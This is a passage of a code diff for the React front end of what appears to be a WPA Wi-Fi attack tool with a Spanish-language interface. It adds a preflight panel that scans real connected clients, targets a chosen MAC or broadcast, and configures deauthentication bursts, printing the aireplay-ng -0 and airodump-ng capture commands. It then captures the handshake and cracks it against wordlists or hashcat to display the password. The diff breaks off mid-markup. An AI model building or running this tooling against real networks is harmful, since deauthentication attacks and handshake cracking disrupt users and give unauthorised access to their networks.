@@ -13,6 +13,7 @@ import {
   signalPct,
   signalColor,
 } from '../../utils/networkFilters'
+import { AttackDiagram } from './AttackDiagram'
 
 // ── constants ─────────────────────────────────────────────────────────────────
 const SG      = '#2aff8a'
@@ -232,14 +233,28 @@ function NetworkDetailPanel({
 
           {tab === 'clients' && (
             <div className="space-y-1.5">
-              <div className="tracking-widest mb-2" style={{ color: 'rgba(42,255,138,0.22)' }}>EST. CLIENTS: {clients.length}</div>
+              <div className="tracking-widest mb-2 text-[8px]" style={{ color: 'rgba(42,255,138,0.22)' }}>
+                DISPOSITIVOS ASOCIADOS — scan desde el panel de ataque
+              </div>
               {clients.map((mac, i) => (
-                <div key={mac} className="flex items-center gap-2 rounded px-2 py-1" style={{ background: 'rgba(42,255,138,0.03)', border: '1px solid rgba(42,255,138,0.06)' }}>
-                  <span style={{ color: 'rgba(42,255,138,0.28)' }} className="text-[8px]">CLI_{i+1}</span>
-                  <span className="font-mono text-[8px] truncate" style={{ color: 'rgba(42,255,138,0.55)' }}>{mac}</span>
-                  <span className="ml-auto text-[7px]" style={{ color: SG, opacity: 0.5 }}>●</span>
+                <div key={mac} className="rounded px-2 py-1.5" style={{ background: 'rgba(42,255,138,0.03)', border: '1px solid rgba(42,255,138,0.06)' }}>
+                  <div className="flex items-center gap-2 mb-1">
+                    <span style={{ color: 'rgba(42,255,138,0.28)' }} className="text-[8px]">CLI_{i+1}</span>
+                    <span className="font-mono text-[8px]" style={{ color: 'rgba(42,255,138,0.55)' }}>{mac}</span>
+                  </div>
+                  <button
+                    onClick={() => onStartAttack(network)}
+                    className="w-full text-[7px] py-1 rounded tracking-widest transition-all"
+                    style={{ background: 'rgba(255,136,0,0.07)', border: '1px solid rgba(255,136,0,0.20)', color: 'rgba(255,136,0,0.65)' }}
+                    onMouseEnter={e => (e.currentTarget.style.background = 'rgba(255,136,0,0.14)')}
+                    onMouseLeave={e => (e.currentTarget.style.background = 'rgba(255,136,0,0.07)')}>
+                    ⚡ TARGET THIS CLIENT
+                  </button>
                 </div>
               ))}
+              <div className="text-[7px] text-center pt-1" style={{ color: 'rgba(42,255,138,0.15)' }}>
+                MACs simuladas — escanea clientes reales desde ⚡ INITIATE ATTACK
+              </div>
             </div>
           )}
         </div>
@@ -261,13 +276,35 @@ function NetworkDetailPanel({
   )
 }
 
-// ── AttackAnimation ───────────────────────────────────────────────────────────
+// ── ScannedClient (from real airodump STATION section) ───────────────────────
+interface ScannedClient {
+  mac: string
+  bssid: string
+  power: number | null
+  packets: number
+  probes: string[]
+  last_seen: string
+}
+
+// ── AttackAnimation (legacy - kept for reference, now using AttackDiagram) ────
 type AnimScene  = 'capture' | 'transfer' | 'decrypt'
 type CrackState = 'idle' | 'cracking' | 'found' | 'failed'
 
-function AttackAnimation({ network, onFinish, onHandoff }: {
+/** @deprecated Use AttackDiagram instead. Kept for reference. */
+export function AttackAnimation({ network, onFinish, onHandoff }: {
   network: Network; onFinish: () => void; onHandoff: (n: Network) => void
 }) {
+  // ── preflight state ───────────────────────────────────────────────────────
+  const [showPreflight,  setShowPreflight]  = useState(true)
+  const [scanLoading,    setScanLoading]    = useState(false)
+  const [scanProgress,   setScanProgress]  = useState(0)
+  const [scanDone,       setScanDone]      = useState(false)
+  const [scannedClients, setScannedClients] = useState<ScannedClient[]>([])
+  const [targetMac,      setTargetMac]     = useState<string | null>(null)
+  const [cfgDeauth,      setCfgDeauth]     = useState(64)
+  const [cfgRetries,     setCfgRetries]    = useState(5)
+  const clientScanWsRef = useRef<WebSocket | null>(null)
+
   // ── capture phase state ───────────────────────────────────────────────────
   const [phase, setPhase]         = useState(0)
   const [pkts,  setPkts]          = useState<{ id: number; x: number; y: number; tx: number; ty: number; p: number; type: 'deauth'|'hs' }[]>([])
@@ -293,24 +330,29 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
   const crackStateRef = useRef<CrackState>('idle')
   crackStateRef.current = crackState
 
-  // ── capture WS state — real backend attack ────────────────────────────────
+  // ── capture WS state ─────────────────────────────────────────────────────
   const selectedInterface                     = useInterfacesStore(s => s.selected)
   const [wsAttempt,      setWsAttempt]        = useState(1)
   const [wsMaxAttempts,  setWsMaxAttempts]    = useState(5)
   const [wsLogs,         setWsLogs]           = useState<string[]>([])
   const [captureFailed,  setCaptureFailed]    = useState(false)
   const [captureFailMsg, setCaptureFailMsg]   = useState('')
+  const [showFullLog,    setShowFullLog]      = useState(false)
   const captureWsRef                          = useRef<WebSocket | null>(null)
   const wsLogsEndRef                          = useRef<HTMLDivElement>(null)
   const prevAttemptRef                        = useRef(1)
 
+  // ── phase animation (visual only — real timing driven by WS events) ───────
+  // NOTE: Don't auto-advance to HASH CAPTURED - that should only happen via real 'handshake' WS event
   useEffect(() => {
-    if (phase >= PHASES.length - 1) return
+    if (showPreflight) return
+    if (phase >= PHASES.length - 2) return // Stop at "INTERCEPTING 4-WAY HS", wait for real capture
     const t = setTimeout(() => setPhase(p => p + 1), PHASES[phase].dur)
     return () => clearTimeout(t)
-  }, [phase])
+  }, [phase, showPreflight])
 
   useEffect(() => {
+    if (showPreflight) return
     let iv: ReturnType<typeof setInterval>
     if (phase === 1) {
       let i = 0
@@ -330,9 +372,10 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
     }
     return () => clearInterval(iv)
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [phase])
+  }, [phase, showPreflight])
 
   useEffect(() => {
+    if (showPreflight) return
     const raf = { current: 0 }
     const tick = () => {
       setPkts(prev => prev.map(p => ({ ...p, p: Math.min(1, p.p + 0.04) })).filter(p => p.p < 1))
@@ -340,17 +383,19 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
     }
     raf.current = requestAnimationFrame(tick)
     return () => cancelAnimationFrame(raf.current)
-  }, [])
+  }, [showPreflight])
 
   useEffect(() => {
+    if (showPreflight) return
     if (phase === 2) {
       clients.forEach((_, i) => setTimeout(() => setGone(prev => [...prev, i]), i * 300))
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [phase])
+  }, [phase, showPreflight])
 
-  // ── connect to real backend capture WS ─────────────────────────────────────
+  // ── connect to real backend capture WS (only after preflight) ────────────
   useEffect(() => {
+    if (showPreflight) return
     if (!selectedInterface || !network.channel) return
 
     const ws = new WebSocket(wsUrl('/api/attacks/handshake'))
@@ -366,28 +411,27 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
             interface:    selectedInterface,
             bssid:        network.bssid,
             channel:      network.channel,
-            deauth_count: 64,
-            max_retries:  5,
+            client_mac:   targetMac,
+            deauth_count: cfgDeauth,
+            max_retries:  cfgRetries,
           }))
           break
         case 'step':
-          setWsLogs(prev => [...prev.slice(-99), ev.message])
-          if (ev.attempt !== undefined) {
-            if (ev.attempt !== prevAttemptRef.current) {
-              prevAttemptRef.current = ev.attempt
-              setWsAttempt(ev.attempt)
-              setWsMaxAttempts(ev.max_retries ?? 5)
-            }
+          setWsLogs(prev => [...prev.slice(-199), ev.message])
+          if (ev.attempt !== undefined && ev.attempt !== prevAttemptRef.current) {
+            prevAttemptRef.current = ev.attempt
+            setWsAttempt(ev.attempt)
+            setWsMaxAttempts(ev.max_retries ?? cfgRetries)
           }
           break
         case 'output':
         case 'warning':
         case 'progress':
-          setWsLogs(prev => [...prev.slice(-99), ev.message])
+          setWsLogs(prev => [...prev.slice(-199), ev.message])
           break
         case 'handshake':
-          setWsLogs(prev => [...prev.slice(-99), `✓ ${ev.message}`])
-          setPhase(PHASES.length - 1) // jump to HASH CAPTURED immediately
+          setWsLogs(prev => [...prev.slice(-199), `✓ ${ev.message}`])
+          setPhase(PHASES.length - 1)
           break
         case 'error':
           setCaptureFailed(true)
@@ -400,170 +444,520 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
     ws.onerror = () => { captureWsRef.current = null }
     return () => { ws.close(); captureWsRef.current = null }
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [network.bssid, network.channel, selectedInterface])
+  }, [showPreflight, network.bssid, network.channel, selectedInterface])
 
-  // ── reset phase animation when attempt increments ─────────────────────────
+  // ── reset animation when new attempt starts ───────────────────────────────
   useEffect(() => {
     if (wsAttempt < 2) return
-    setPhase(0)
-    setGone([])
-    setPkts([])
-    pktId.current = 0
+    setPhase(0); setGone([]); setPkts([]); pktId.current = 0
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [wsAttempt])
 
-  // ── auto-scroll WS logs ───────────────────────────────────────────────────
-  useEffect(() => {
-    wsLogsEndRef.current?.scrollIntoView({ behavior: 'smooth' })
-  }, [wsLogs])
+  useEffect(() => { wsLogsEndRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [wsLogs])
 
-  // ── auto-transition to decrypt after HASH CAPTURED ───────────────────────
+  // ── auto-transition to decrypt after HASH CAPTURED ────────────────────────
   useEffect(() => {
     if (phase !== PHASES.length - 1) return
-
     setWlLoading(true)
-    Promise.all([
-      credentialsApi.listHandshakes(),
-      credentialsApi.listWordlists(),
-    ]).then(([hsList, wlList]) => {
-      const hs = hsList
-        .filter(h => h.bssid.toUpperCase() === network.bssid.toUpperCase())
-        .sort((a, b) => new Date(b.captured_at).getTime() - new Date(a.captured_at).getTime())[0] ?? null
-      setHandshake(hs ?? null)
-      setWordlists(wlList)
-      setWlLoading(false)
-    }).catch(() => setWlLoading(false))
-
+    Promise.all([credentialsApi.listHandshakes(), credentialsApi.listWordlists()])
+      .then(([hsList, wlList]) => {
+        const hs = hsList
+          .filter(h => h.bssid.toUpperCase() === network.bssid.toUpperCase())
+          .sort((a, b) => new Date(b.captured_at).getTime() - new Date(a.captured_at).getTime())[0] ?? null
+        setHandshake(hs ?? null)
+        setWordlists(wlList)
+        setWlLoading(false)
+      }).catch(() => setWlLoading(false))
     const tickIv = setInterval(() => setXferTick(t => t + 1), 350)
     const tXfer = setTimeout(() => {
       setScene('transfer')
       const tDecrypt = setTimeout(() => setScene('decrypt'), 1800)
       return () => clearTimeout(tDecrypt)
     }, 2000)
-
     return () => { clearTimeout(tXfer); clearInterval(tickIv) }
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [phase])
 
-  // ── auto-scroll crack logs ────────────────────────────────────────────────
-  useEffect(() => {
-    logsEndRef.current?.scrollIntoView({ behavior: 'smooth' })
-  }, [crackLogs])
+  useEffect(() => { logsEndRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [crackLogs])
 
   // ── WebSocket crack ───────────────────────────────────────────────────────
   const wordlist = wlTab === 'server' ? (selectedWl ?? '') : customPath.trim()
-
   const { connect: startCrack, disconnect: stopCrack } = useWebSocket({
     path: '/api/attacks/crack',
     config: { handshake_id: handshake?.id ?? 0, wordlist, use_hashcat: useHashcat },
     onEvent: (event) => {
-      if (event.type === 'output' || event.type === 'step') {
-        setCrackLogs(prev => [...prev.slice(-149), event.message])
-      }
-      if (event.type === 'progress' && event.progress !== undefined) {
-        setCrackProgress(event.progress)
-      }
-      if (event.type === 'credential') {
-        const pwd = (event.data?.password as string) ?? event.message
-        setFoundPwd(pwd)
-        setCrackState('found')
-      }
+      if (event.type === 'output' || event.type === 'step') setCrackLogs(prev => [...prev.slice(-149), event.message])
+      if (event.type === 'progress' && event.progress !== undefined) setCrackProgress(event.progress)
+      if (event.type === 'credential') { setFoundPwd((event.data?.password as string) ?? event.message); setCrackState('found') }
       if (event.type === 'done' && crackStateRef.current !== 'found') setCrackState('failed')
       if (event.type === 'error') setCrackState('failed')
     },
   })
+  const handleStartCrack  = () => { setCrackState('cracking'); setCrackLogs([]); setCrackProgress(0); setFoundPwd(null); startCrack() }
+  const handleRetryCrack  = () => { stopCrack(); setCrackState('idle'); setCrackLogs([]); setCrackProgress(0); setFoundPwd(null) }
 
-  const handleStartCrack = () => {
-    setCrackState('cracking')
-    setCrackLogs([])
-    setCrackProgress(0)
-    setFoundPwd(null)
-    startCrack()
+  // ── helpers ───────────────────────────────────────────────────────────────
+  const resetCapture = (newTarget?: string | null) => {
+    setCaptureFailed(false); setPhase(0); setWsAttempt(1); setWsLogs([])
+    prevAttemptRef.current = 1; setGone([]); setPkts([]); pktId.current = 0
+    setHandshake(null); setCrackState('idle'); setCrackLogs([]); setCrackProgress(0)
+    if (newTarget !== undefined) setTargetMac(newTarget)
+    // Force WS useEffect to re-run by toggling preflight off-on-off
+    setShowPreflight(true)
+    setTimeout(() => setShowPreflight(false), 50)
   }
 
-  const handleRetryCrack = () => {
-    stopCrack()
-    setCrackState('idle')
-    setCrackLogs([])
-    setCrackProgress(0)
-    setFoundPwd(null)
+  const startClientScan = () => {
+    if (!selectedInterface || !network.channel) return
+    setScanLoading(true); setScanDone(false); setScanProgress(0); setScannedClients([])
+    const ws = new WebSocket(wsUrl('/api/attacks/scan-clients'))
+    clientScanWsRef.current = ws
+    ws.onmessage = (msg: MessageEvent) => {
+      let ev: { type: string; message: string; progress?: number; data?: ScannedClient }
+      try { ev = JSON.parse(msg.data as string) } catch { return }
+      if (ev.type === 'ready') {
+        ws.send(JSON.stringify({ interface: selectedInterface, bssid: network.bssid, channel: network.channel, duration: 15 }))
+      }
+      if (ev.type === 'client' && ev.data) {
+        setScannedClients(prev => {
+          if (prev.find(c => c.mac === ev.data!.mac)) return prev
+          return [...prev, ev.data!]
+        })
+      }
+      if (ev.type === 'client_update' && ev.data) {
+        setScannedClients(prev => prev.map(c => c.mac === ev.data!.mac ? ev.data! : c))
+      }
+      if (ev.type === 'progress' && ev.progress !== undefined) setScanProgress(ev.progress)
+      if (ev.type === 'done' || ev.type === 'error') { setScanLoading(false); setScanDone(true) }
+    }
+    ws.onerror = () => { setScanLoading(false); setScanDone(true) }
+    ws.onclose = () => { setScanLoading(false) }
   }
 
   const cur = PHASES[phase]
-  const clientPositions = clients.map((_, i) => ({ cx: 10 + i * 52, cy: 72 }))
+  // topology nodes — real scanned clients if available, else simulated
+  const topologyClients = scannedClients.length > 0
+    ? scannedClients.slice(0, 4).map(c => c.mac)
+    : clients
+  const topologyPositions = topologyClients.map((_, i) => ({ cx: 10 + i * 52, cy: 72 }))
   const dots = '.'.repeat(xferTick % 4)
 
-  // ══════════════════════════════════════════════════════════════════════════
-  // SCENE: capture failed (all retries exhausted)
-  // ══════════════════════════════════════════════════════════════════════════
-  if (captureFailed) {
+  // ════════════════════════════════════════════════════════════════════════════
+  // SCENE: PREFLIGHT — interface check + client scan + config
+  // ════════════════════════════════════════════════════════════════════════════
+  if (showPreflight) {
+    const ifaceOK    = !!selectedInterface
+    const channelOK  = !!network.channel
+    const canStart   = ifaceOK && channelOK
+
     return (
-      <div className="absolute inset-0 z-30 flex flex-col items-center justify-center px-5"
-        style={{ background: 'rgba(3,6,10,0.97)', backdropFilter: 'blur(10px)' }}>
-        <button onClick={onFinish} className="absolute top-3 right-4 text-xs transition-colors"
-          style={{ color: 'rgba(255,68,68,0.30)' }}
-          onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,68,68,0.75)')}
-          onMouseLeave={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,68,68,0.30)')}>ESC ✕</button>
+      <div className="absolute inset-0 z-30 flex flex-col" style={{ background: 'rgba(3,6,10,0.98)', backdropFilter: 'blur(12px)' }}>
+        <button onClick={onFinish} className="absolute top-3 right-4 z-10 text-xs transition-colors" style={{ color: 'rgba(255,68,68,0.25)' }}
+          onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,68,68,0.70)')}
+          onMouseLeave={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,68,68,0.25)')}>ESC ✕</button>
 
-        <div className="text-4xl mb-3" style={{ filter: 'drop-shadow(0 0 20px #ff4444)' }}>✗</div>
-        <div className="text-[10px] font-bold tracking-[0.3em] mb-2" style={{ color: '#ff4444' }}>
-          HANDSHAKE CAPTURE FAILED
-        </div>
-        <div className="text-[8px] font-mono text-center mb-4 leading-relaxed" style={{ color: 'rgba(255,68,68,0.55)', maxWidth: 280 }}>
-          {captureFailMsg}
-        </div>
-
-        {/* diagnostic log */}
-        {wsLogs.length > 0 && (
-          <div className="w-full rounded p-2.5 mb-4 max-h-40 overflow-y-auto font-mono text-[8px] space-y-0.5"
-            style={{ background: 'rgba(255,68,68,0.04)', border: '1px solid rgba(255,68,68,0.15)' }}>
-            {wsLogs.slice(-20).map((l, i) => (
-              <div key={i} style={{ color: l.startsWith('✗') ? '#ff4444' : 'rgba(255,68,68,0.45)' }}>{l}</div>
-            ))}
+        {/* header */}
+        <div className="px-4 pt-4 pb-3 shrink-0" style={{ borderBottom: '1px solid rgba(42,255,138,0.07)' }}>
+          <div className="flex items-center gap-2.5 mb-1">
+            <span className="text-lg" style={{ color: '#ff4444', filter: 'drop-shadow(0 0 10px #ff4444)' }}>⚡</span>
+            <span className="text-[12px] font-bold tracking-[0.3em]" style={{ color: '#ff4444' }}>ATAQUE WPA HANDSHAKE</span>
           </div>
-        )}
-
-        <div className="text-[8px] font-bold tracking-wider mb-3" style={{ color: 'rgba(255,68,68,0.35)' }}>
-          CHECKLIST
+          <div className="text-[9px] font-mono" style={{ color: 'rgba(42,255,138,0.35)' }}>
+            {network.ssid ?? '(hidden)'} · {network.bssid} · CH {network.channel ?? '?'}
+          </div>
         </div>
-        <div className="space-y-1.5 mb-5 w-full" style={{ maxWidth: 280 }}>
-          {[
-            ['airmon-ng start wlanX', 'Interfaz en modo monitor'],
-            ['Clientes activos', 'Dispositivos conectados al AP'],
-            ['Canal correcto', `CH ${network.channel ?? '?'} — usa -c ${network.channel ?? '?'}`],
-            ['Proximidad al AP', 'Acércate para mejor señal'],
-          ].map(([cmd, label]) => (
-            <div key={cmd} className="flex items-center gap-2 text-[8px]">
-              <span style={{ color: 'rgba(255,68,68,0.40)' }}>○</span>
-              <span style={{ color: 'rgba(255,68,68,0.60)' }}>{label}</span>
-              <span className="ml-auto font-mono" style={{ color: 'rgba(255,68,68,0.28)' }}>{cmd}</span>
+
+        <div className="flex-1 overflow-y-auto px-4 py-3 space-y-3">
+
+          {/* PRE-FLIGHT CHECKS */}
+          <div className="rounded-lg overflow-hidden" style={{ border: '1px solid rgba(42,255,138,0.10)' }}>
+            <div className="px-3 py-2 text-[8px] font-bold tracking-[0.25em]" style={{ background: 'rgba(42,255,138,0.04)', color: 'rgba(42,255,138,0.45)', borderBottom: '1px solid rgba(42,255,138,0.07)' }}>
+              PRE-FLIGHT CHECKS
             </div>
-          ))}
+            <div className="p-3 space-y-2">
+              {[
+                {
+                  ok: ifaceOK,
+                  label: 'Interfaz monitor',
+                  detail: ifaceOK ? selectedInterface! : 'No seleccionada — selecciona una interfaz',
+                  fix: !ifaceOK ? 'airmon-ng start wlan0' : null,
+                },
+                {
+                  ok: channelOK,
+                  label: 'Canal del AP',
+                  detail: channelOK ? `CH ${network.channel}` : 'Canal desconocido — rescanea la red',
+                  fix: null,
+                },
+                {
+                  ok: (network.encryption?.toUpperCase().includes('WPA') ?? false),
+                  label: 'Encriptación WPA',
+                  detail: network.encryption ?? 'Unknown',
+                  fix: null,
+                },
+              ].map(({ ok, label, detail, fix }) => (
+                <div key={label} className="flex items-start gap-2.5 text-[8px]">
+                  <span className="mt-0.5 shrink-0 text-[10px]" style={{ color: ok ? SG : '#ff4444' }}>{ok ? '✓' : '✗'}</span>
+                  <div className="flex-1 min-w-0">
+                    <div className="flex items-center gap-2">
+                      <span className="font-bold tracking-wider" style={{ color: ok ? 'rgba(42,255,138,0.70)' : 'rgba(255,68,68,0.75)' }}>{label}</span>
+                      <span className="font-mono" style={{ color: ok ? 'rgba(42,255,138,0.40)' : 'rgba(255,68,68,0.45)' }}>{detail}</span>
+                    </div>
+                    {fix && (
+                      <div className="font-mono mt-0.5 px-1.5 py-0.5 rounded inline-block" style={{ background: 'rgba(255,136,0,0.08)', color: 'rgba(255,136,0,0.65)', border: '1px solid rgba(255,136,0,0.15)' }}>
+                        $ {fix}
+                      </div>
+                    )}
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          {/* CLIENT SCANNER */}
+          <div className="rounded-lg overflow-hidden" style={{ border: '1px solid rgba(0,229,255,0.12)' }}>
+            <div className="px-3 py-2 flex items-center gap-2" style={{ background: 'rgba(0,229,255,0.04)', borderBottom: '1px solid rgba(0,229,255,0.07)' }}>
+              <span className="text-[8px] font-bold tracking-[0.25em] flex-1" style={{ color: 'rgba(0,229,255,0.55)' }}>
+                📡 ESCANEAR CLIENTES REALES
+              </span>
+              {!scanLoading && !scanDone && (
+                <button disabled={!canStart} onClick={startClientScan}
+                  className="px-2.5 py-1 rounded text-[8px] font-bold tracking-widest transition-all"
+                  style={{
+                    background: canStart ? 'rgba(0,229,255,0.09)' : 'rgba(255,255,255,0.02)',
+                    border: `1px solid ${canStart ? 'rgba(0,229,255,0.30)' : 'rgba(255,255,255,0.05)'}`,
+                    color: canStart ? '#00e5ff' : 'rgba(255,255,255,0.15)',
+                    cursor: canStart ? 'pointer' : 'not-allowed',
+                  }}>
+                  SCAN 15s
+                </button>
+              )}
+              {scanLoading && (
+                <div className="flex items-center gap-1.5">
+                  <span className="animate-pulse text-[8px]" style={{ color: '#00e5ff' }}>●</span>
+                  <span className="text-[7px] font-mono" style={{ color: 'rgba(0,229,255,0.45)' }}>{scanProgress}%</span>
+                  <button onClick={() => { clientScanWsRef.current?.close(); setScanLoading(false) }}
+                    className="text-[7px] ml-1" style={{ color: 'rgba(255,68,68,0.45)' }}>✕</button>
+                </div>
+              )}
+              {scanDone && !scanLoading && (
+                <button onClick={() => { setScanDone(false); startClientScan() }}
+                  className="px-2 py-1 rounded text-[7px] tracking-widest" style={{ color: 'rgba(0,229,255,0.45)', border: '1px solid rgba(0,229,255,0.15)' }}>
+                  ↺ RESCAN
+                </button>
+              )}
+            </div>
+            {scanLoading && (
+              <div className="px-3 py-2">
+                <div className="h-1 rounded overflow-hidden" style={{ background: 'rgba(0,229,255,0.07)' }}>
+                  <div className="h-full transition-all duration-500" style={{ width: `${scanProgress}%`, background: '#00e5ff', boxShadow: '0 0 6px #00e5ff' }} />
+                </div>
+                <div className="text-[7px] mt-1 font-mono animate-pulse" style={{ color: 'rgba(0,229,255,0.35)' }}>
+                  Escaneando dispositivos en {network.bssid}…
+                </div>
+              </div>
+            )}
+            {scannedClients.length === 0 && scanDone && (
+              <div className="px-3 py-3 text-center text-[8px]" style={{ color: 'rgba(0,229,255,0.30)' }}>
+                Sin clientes detectados — puede que no haya dispositivos conectados.<br/>
+                <span style={{ color: 'rgba(0,229,255,0.18)', fontSize: 7 }}>Se usará deauth broadcast (menos efectivo pero funciona).</span>
+              </div>
+            )}
+            {scannedClients.length > 0 && (
+              <div className="p-3 space-y-1.5">
+                <div className="text-[7px] tracking-widest mb-2" style={{ color: 'rgba(0,229,255,0.30)' }}>
+                  {scannedClients.length} DISPOSITIVO(S) — click para objetivo
+                </div>
+                {/* Broadcast option */}
+                <button onClick={() => setTargetMac(null)}
+                  className="w-full flex items-center gap-2 px-2.5 py-2 rounded text-left transition-all"
+                  style={{
+                    background: targetMac === null ? 'rgba(255,136,0,0.10)' : 'rgba(255,255,255,0.02)',
+                    border: `1px solid ${targetMac === null ? 'rgba(255,136,0,0.35)' : 'rgba(255,255,255,0.06)'}`,
+                  }}>
+                  <span style={{ color: targetMac === null ? '#ff8800' : 'rgba(255,255,255,0.25)', fontSize: 11 }}>{targetMac === null ? '◉' : '○'}</span>
+                  <span className="text-[8px] font-bold tracking-wider" style={{ color: targetMac === null ? '#ff8800' : 'rgba(255,255,255,0.35)' }}>BROADCAST (todos los clientes)</span>
+                </button>
+                {scannedClients.map(c => {
+                  const pct  = c.power ? Math.max(0, Math.min(100, ((c.power + 30) / -65) * -100 + 100)) : 0
+                  const isTarget = targetMac === c.mac
+                  return (
+                    <button key={c.mac} onClick={() => setTargetMac(isTarget ? null : c.mac)}
+                      className="w-full flex items-start gap-2 px-2.5 py-2 rounded text-left transition-all"
+                      style={{
+                        background: isTarget ? 'rgba(0,229,255,0.09)' : 'rgba(0,229,255,0.02)',
+                        border: `1px solid ${isTarget ? 'rgba(0,229,255,0.30)' : 'rgba(0,229,255,0.07)'}`,
+                      }}>
+                      <span className="mt-0.5 shrink-0" style={{ color: isTarget ? '#00e5ff' : 'rgba(0,229,255,0.28)', fontSize: 11 }}>{isTarget ? '◉' : '○'}</span>
+                      <div className="flex-1 min-w-0">
+                        <div className="flex items-center gap-2 mb-0.5">
+                          <span className="font-mono text-[9px] font-bold" style={{ color: isTarget ? '#00e5ff' : 'rgba(0,229,255,0.65)' }}>{c.mac}</span>
+                          <span className="ml-auto text-[7px] font-mono" style={{ color: 'rgba(0,229,255,0.35)' }}>{c.power ?? '?'} dBm</span>
+                        </div>
+                        <div className="flex items-center gap-2">
+                          <div className="flex-1 h-1 rounded overflow-hidden" style={{ background: 'rgba(0,229,255,0.07)' }}>
+                            <div className="h-full rounded transition-all" style={{ width: `${pct}%`, background: '#00e5ff' }} />
+                          </div>
+                          <span className="text-[7px] font-mono" style={{ color: 'rgba(0,229,255,0.30)' }}>{c.packets} pkts</span>
+                          {c.probes.length > 0 && (
+                            <span className="text-[7px] truncate max-w-[80px]" style={{ color: 'rgba(0,229,255,0.22)' }}>{c.probes[0]}</span>
+                          )}
+                        </div>
+                      </div>
+                    </button>
+                  )
+                })}
+              </div>
+            )}
+            {scannedClients.length === 0 && !scanLoading && !scanDone && (
+              <div className="px-3 py-3 text-center text-[7px]" style={{ color: 'rgba(0,229,255,0.20)' }}>
+                Escanea para descubrir dispositivos reales o usa BROADCAST
+              </div>
+            )}
+          </div>
+
+          {/* ATTACK CONFIG */}
+          <div className="rounded-lg overflow-hidden" style={{ border: '1px solid rgba(42,255,138,0.09)' }}>
+            <div className="px-3 py-2 text-[8px] font-bold tracking-[0.25em]" style={{ background: 'rgba(42,255,138,0.03)', color: 'rgba(42,255,138,0.40)', borderBottom: '1px solid rgba(42,255,138,0.06)' }}>
+              CONFIGURACIÓN
+            </div>
+            <div className="p-3 space-y-2.5">
+              <div className="flex items-center gap-3">
+                <span className="text-[8px] tracking-wider w-28 shrink-0" style={{ color: 'rgba(42,255,138,0.35)' }}>DEAUTH / BURST</span>
+                <div className="flex gap-1">
+                  {[16, 32, 64, 128].map(v => (
+                    <button key={v} onClick={() => setCfgDeauth(v)}
+                      className="px-2 py-1 rounded text-[8px] font-mono transition-all"
+                      style={{
+                        background: cfgDeauth === v ? 'rgba(42,255,138,0.12)' : 'rgba(42,255,138,0.03)',
+                        border: `1px solid ${cfgDeauth === v ? SG + '40' : 'rgba(42,255,138,0.08)'}`,
+                        color: cfgDeauth === v ? SG : 'rgba(42,255,138,0.35)',
+                      }}>{v}</button>
+                  ))}
+                </div>
+              </div>
+              <div className="flex items-center gap-3">
+                <span className="text-[8px] tracking-wider w-28 shrink-0" style={{ color: 'rgba(42,255,138,0.35)' }}>MAX RETRIES</span>
+                <div className="flex gap-1">
+                  {[1, 3, 5, 10].map(v => (
+                    <button key={v} onClick={() => setCfgRetries(v)}
+                      className="px-2 py-1 rounded text-[8px] font-mono transition-all"
+                      style={{
+                        background: cfgRetries === v ? 'rgba(42,255,138,0.12)' : 'rgba(42,255,138,0.03)',
+                        border: `1px solid ${cfgRetries === v ? SG + '40' : 'rgba(42,255,138,0.08)'}`,
+                        color: cfgRetries === v ? SG : 'rgba(42,255,138,0.35)',
+                      }}>{v}</button>
+                  ))}
+                </div>
+              </div>
+              <div className="font-mono text-[7px] rounded px-2 py-1.5" style={{ background: 'rgba(0,0,0,0.35)', color: 'rgba(42,255,138,0.25)' }}>
+                $ airodump-ng -c {network.channel ?? '?'} --bssid {network.bssid} -w /tmp/cap {selectedInterface ?? '<iface>'}<br/>
+                $ aireplay-ng -0 {cfgDeauth} -a {network.bssid}{targetMac ? ` -c ${targetMac}` : ''} {selectedInterface ?? '<iface>'}
+              </div>
+            </div>
+          </div>
         </div>
 
-        <div className="flex gap-2 w-full" style={{ maxWidth: 280 }}>
-          <button onClick={() => { setCaptureFailed(false); setPhase(0); setWsAttempt(1); setWsLogs([]); prevAttemptRef.current = 1 }}
-            className="flex-1 py-2 rounded font-bold text-[9px] tracking-widest transition-all"
-            style={{ background: 'rgba(42,255,138,0.07)', border: '1px solid rgba(42,255,138,0.20)', color: 'rgba(42,255,138,0.55)' }}
-            onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.background = 'rgba(42,255,138,0.14)')}
-            onMouseLeave={e => ((e.currentTarget as HTMLButtonElement).style.background = 'rgba(42,255,138,0.07)')}>
-            ↺ REINTENTAR
-          </button>
-          <button onClick={() => { onHandoff(network); onFinish() }}
-            className="flex-1 py-2 rounded font-bold text-[9px] tracking-widest transition-all"
-            style={{ background: 'rgba(255,68,68,0.08)', border: '1px solid rgba(255,68,68,0.22)', color: 'rgba(255,110,110,0.80)' }}
-            onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.background = 'rgba(255,68,68,0.16)')}
-            onMouseLeave={e => ((e.currentTarget as HTMLButtonElement).style.background = 'rgba(255,68,68,0.08)')}>
-            → CONSOLA
+        {/* START ATTACK */}
+        <div className="px-4 pb-4 shrink-0 pt-3 space-y-2" style={{ borderTop: '1px solid rgba(42,255,138,0.07)' }}>
+          {targetMac && (
+            <div className="flex items-center gap-2 px-3 py-1.5 rounded" style={{ background: 'rgba(0,229,255,0.06)', border: '1px solid rgba(0,229,255,0.18)' }}>
+              <span style={{ color: '#00e5ff', fontSize: 9 }}>◉</span>
+              <span className="text-[8px] font-mono" style={{ color: 'rgba(0,229,255,0.65)' }}>TARGET: {targetMac}</span>
+              <button onClick={() => setTargetMac(null)} className="ml-auto text-[8px]" style={{ color: 'rgba(0,229,255,0.35)' }}>✕</button>
